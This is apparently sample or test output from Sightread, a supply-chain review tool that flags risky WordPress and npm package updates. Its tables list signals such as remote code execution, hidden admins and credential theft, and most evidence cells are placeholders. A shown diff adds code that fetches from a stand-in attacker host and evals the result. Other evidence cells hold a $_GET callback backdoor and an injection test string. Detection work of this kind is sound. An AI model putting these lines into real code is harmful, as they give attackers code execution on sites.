## Sightread: 1 to hold, 1 to review and 1 unverified

> \--skip-roadie-verify was used

**Incomplete review:** 1 update couldn't be verified, 1 package wasn't checked and 1 error.

| Verdict | Update | From | To | Findings |
|---|---|---|---|---|
| 🛑 HOLD | countdown-timer-ultimate (wp-plugin) | 2.6.7 | 2.6.8 | 11 critical |
| ⚠️ REVIEW | \@acme/widgets (npm) | 1.4.0 | 1.5.0 | 21 high, 12 medium |
| ⚠️ UNVERIFIED | astra (wp-theme) | 4.8.0 | 4.8.1 | none |
| ✅ ALLOWED | wordfence (wp-plugin) | 7.11.6 | 7.11.7 | 1 allowed |
| ✅ ROUTINE | monolog/monolog (composer) | 3.12.0 | 3.12.1 | 3 low, 3 info |
| ✅ ROUTINE | wpforms-lite (wp-plugin) on 2 sites | 1.9.1 | 1.9.2 | none |

### 🛑 countdown-timer-ultimate 2.6.7 → 2.6.8

Integrity (both versions): every file matches wordpress.org checksums \(SHA-256\). Publisher: sampleauthor.
Changelog: 2.6.8: "Check compatibility with WordPress 6.8"

| Severity | Signal | Where | Evidence |
|---|---|---|---|
| critical | Archive does not match the published hash | `includes/integrity-mismatch.php:10` | `integrity-mismatch evidence` |
| critical | Same version, different bytes than the lockfile recorded | `includes/version-republished.php:10` | `version-republished evidence` |
| critical | Allowed version now has a different hash | `includes/approved-version-changed.php:10` | `approved-version-changed evidence` |
| critical | Listed as malicious by OSV | `includes/known-malicious.php:10` | `known-malicious evidence` |
| critical | Closed on WordPress.org | `includes/wporg-closed.php:10` | `wporg-closed evidence` |
| critical | Archive entry points outside the package | `includes/archive-path-escape.php:10` | `archive-path-escape evidence` |
| critical | Fetches remote code and runs it | `includes/class-wpos-analytics.php:88` | `wp_remote_get('hxxps://analytics.wpos-cdn[.]example/v2/p') → eval($body)` |
| critical | Decodes hidden code and runs it | `includes/decode-exec.php:10` | `decode-exec evidence` |
| critical | Hides users from the admin user list | `includes/admin-user-hidden.php:10` | `admin-user-hidden evidence` |
| critical | Private name also published publicly | `includes/dependency-confusion.php:10` | `dependency-confusion evidence` |
| critical | Runs code built at run time (raised by owner-change) | `includes/loader.php:20` | `$f = $_GET['cb']; $f();` |

<details><summary>Diff of the flagged lines</summary>

```diff
@@ -80,2 +80,4 @@ includes/class-wpos-analytics.php
 function wpos_init() {
+  $b = wp_remote_get('hxxps://analytics.wpos-cdn[.]example/v2/p');
+  eval($b['body']);
 }
```
</details>

Record your review: `rhythm sightread allow wp-plugin:countdown-timer-ultimate@2.6.8 --reason "..."`

### ⚠️ \@acme/widgets 1.4.0 → 1.5.0

Integrity (both versions): verified by signature. Publisher: not known.
Changelog: none for this version.

| Severity | Signal | Where | Evidence |
|---|---|---|---|
| high | Lockfile entry moved off the registry | `includes/lockfile-source-change.php:10` | `lockfile-source-change evidence` |
| high | Archive holds a link or special file | `includes/archive-link.php:10` | `archive-link evidence` |
| high | Archive holds two entries with the same name | `includes/archive-collision.php:10` | `archive-collision evidence` |
| high | Code that could not be analysed | `includes/unanalysed.php:10` | `unanalysed evidence` |
| high | Runs code built at run time | `includes/eval-dynamic.php:10` | `eval-dynamic evidence` |
| high | Adds a large encoded or scrambled blob | `includes/obfuscation.php:10` | `obfuscation evidence` |
| high | Unserializes request or remote data | `includes/input-unserialize.php:10` | `input-unserialize evidence` |
| high | Writes files outside its own folder | `includes/write-outside-package.php:10` | `write-outside-package evidence` |
| high | Creates an administrator account | `includes/admin-user-create.php:10` | `admin-user-create evidence` |
| high | Grants admin capabilities to another role | `includes/capability-change.php:10` | `capability-change evidence` |
| high | Blocks updates of other plugins or themes | `includes/update-suppression.php:10` | `update-suppression evidence` |
| high | Shows search engines different content | `includes/bot-cloaking.php:10` | `bot-cloaking evidence` |
| high | Reads credentials or tokens | `includes/credential-access.php:10` | `credential-access evidence` |
| high | Sends site data to a new host | `includes/data-exfil.php:10` | `data-exfil evidence` |
| high | Hides code in an image, font or text file | `includes/code-in-asset.php:10` | `code-in-asset evidence` |
| high | Adds or changes an install script | `includes/npm-install-script-new.php:10` | `npm-install-script-new evidence` |
| high | Runs code when Composer installs it | `includes/composer-plugin-new.php:10` | `composer-plugin-new evidence` |
| high | New owner or publisher | `includes/owner-change.php:10` | `owner-change evidence` |
| high | Release lost its build provenance | `includes/provenance-dropped.php:10` | `provenance-dropped evidence` |
| high | New dependency named like a popular package | `includes/typosquat.php:10` | `typosquat evidence` |
| high | Has a known vulnerability | `includes/known-vulnerable.php:10` | `known-vulnerable evidence` |
| medium | Contacts a new domain | `includes/outbound-new-domain.php:10` | `outbound-new-domain evidence` |
| medium | Adds a REST route anyone can call | `includes/rest-open-route.php:10` | `rest-open-route evidence` |
| medium | Changelog does not mention what the code adds | `includes/changelog-mismatch.php:10` | `changelog-mismatch evidence` |
| medium | Adds a runtime dependency | `includes/dependency-new.php:10` | `dependency-new evidence` |
| medium | Adds a file that runs on every request | `includes/composer-autoload-files.php:10` | `composer-autoload-files evidence` |
| medium | Released very recently | `includes/fresh-release.php:10` | `fresh-release evidence` |
| medium | First release after a long silence | `includes/dormant-release.php:10` | `dormant-release evidence` |
| medium | No matching tag in the repository | `includes/git-tag-missing.php:10` | `git-tag-missing evidence` |
| medium | Code grew far more than usual | `includes/size-jump.php:10` | `size-jump evidence` |
| medium | Hidden or bidirectional characters in code | `includes/admin.php:12` | `\x1b[31mredtxt.php <script>alert(1)</script> [link](hxxps://evil[.]example) @team token npm_•••••` |
| medium | Adds a credential to the code | `includes/config.php:3` | `define('API_KEY', 'sk_l•••••');` |
| medium | Adds a large encoded or scrambled blob (demoted: vendored path) | `assets/js/vendor.min.js:1` | `var _0x1a2b=['\x65\x76\x61\x6c'];` |

Not counted: 1 in the baseline, 1 ignored by config and 1 below --min-confidence.

Record your review: `rhythm sightread allow npm:@acme/widgets@1.5.0 --reason "..."`

### Unverified

- astra 4.8.1 (wp-theme): couldn't verify astra 4.8.1: wordpress.org checksums answered 503

Not reviewed as verified releases; `--allow-unverified` reviews them anyway.

### Not checked

- gravityforms 2.8.1 (wp-plugin): not on WordPress.org. Give the vendor's zip with --to-file
- left-pad (npm): can't reach registry.npmjs.org \(no such host\) (E7)

### Warnings

- local-drift: wp-mail-smtp on disk is not the 4.1.1 wordpress.org ships

---

Static diff of official releases; Sightread never ran this code. Not proof an update is safe.

Sightread reports what changed. It does not judge intent.

[Signal reference](https://github.com/RhythmShahriar/rhythm/wiki/Sightread-Signal-Reference) · rhythm-sightread <version>
